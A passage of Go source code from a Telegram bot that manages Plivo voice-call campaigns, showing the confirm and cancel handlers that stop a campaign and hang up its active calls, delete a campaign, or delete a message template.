	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
		{
			tgbotapi.NewInlineKeyboardButtonData("✅ Yes, Continue", MarshalCallbackData(ActionConfirmYes, map[string]string{"action": action, "id": strconv.FormatInt(campaignID, 10)})),
			tgbotapi.NewInlineKeyboardButtonData("❌ Cancel", MarshalCallbackData(ActionConfirmNo, nil)),
		},
	}

	b.editReplyMarkup(callback.Message.Chat.ID, callback.Message.MessageID, text, &keyboard)
}

// handleConfirmYes handles confirmation yes
func (b *Bot) handleConfirmYes(callback *tgbotapi.CallbackQuery, userID int64) {
	_, exists := botStateGlobal.GetUserState(userID)
	if !exists {
		b.answerCallback(callback.ID, "❌ Session expired", true)
		return
	}

	origCb, _ := ParseCallbackData(callback.Data)
	action := origCb.Data["action"]
	campaignID, _ := strconv.ParseInt(origCb.Data["id"], 10, 64)

	botStateGlobal.ClearUserState(userID)

	switch action {
	case ActionCampaignStop:
		b.stopCampaignConfirm(callback, campaignID)
	case ActionCampaignDelete:
		b.deleteCampaignConfirm(callback, campaignID)
	case "delete_template":
		b.deleteTemplateConfirm(callback, origCb.Data["name"])
	default:
		b.answerCallback(callback.ID, "❌ Unknown action", true)
	}
}

// handleConfirmNo handles confirmation no
func (b *Bot) handleConfirmNo(callback *tgbotapi.CallbackQuery, userID int64) {
	botStateGlobal.ClearUserState(userID)
	b.answerCallback(callback.ID, "❌ Action cancelled", false)
	b.showMainMenu(callback.Message.Chat.ID, callback.Message.MessageID)
}

// stopCampaignConfirm stops campaign after confirmation
func (b *Bot) stopCampaignConfirm(callback *tgbotapi.CallbackQuery, campaignID int64) {
	campaign, _ := b.db.GetCampaign(campaignID)
	if campaign == nil {
		b.answerCallback(callback.ID, "❌ Campaign not found", true)
		return
	}

	b.db.UpdateCampaignStatus(campaignID, string(models.CampaignStatusCancelled))
	
	b.mu.Lock()
	if s, ok := b.campaignState[campaignID]; ok {
		s.mu.Lock()
		s.Status = "stopped"
		s.mu.Unlock()
	}
	campaignCallUUIDs := make([]string, 0)
	for uuid, call := range b.activeCalls {
		if call.CampaignID == campaignID {
			campaignCallUUIDs = append(campaignCallUUIDs, uuid)
		}
	}
	b.mu.Unlock()

	for _, uuid := range campaignCallUUIDs {
		b.plivo.HangupCall(uuid)
	}

	b.answerCallback(callback.ID, "🛑 Campaign stopped", false)
	b.showCampaignDetail(callback.Message.Chat.ID, callback.Message.MessageID, campaignID)
}

// deleteCampaignConfirm deletes campaign after confirmation
func (b *Bot) deleteCampaignConfirm(callback *tgbotapi.CallbackQuery, campaignID int64) {
	campaign, _ := b.db.GetCampaign(campaignID)
	if campaign == nil {
		b.answerCallback(callback.ID, "❌ Campaign not found", true)
		return
	}

	b.db.DeleteCampaign(campaignID)
	delete(b.campaignState, campaignID)

	b.answerCallback(callback.ID, "🗑️ Campaign deleted", false)
	b.showCampaigns(callback.Message.Chat.ID, callback.Message.MessageID)
}

// deleteTemplateConfirm deletes template after confirmation
func (b *Bot) deleteTemplateConfirm(callback *tgbotapi.CallbackQuery, name string) {
	b.db.DeleteTemplate(name)

	b.answerCallback(callback.ID, "🗑️ Template deleted", false)
	b.showTemplates(callback.Message.Chat.ID, callback.Message.MessageID)
}

// min returns minimum of two ints
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
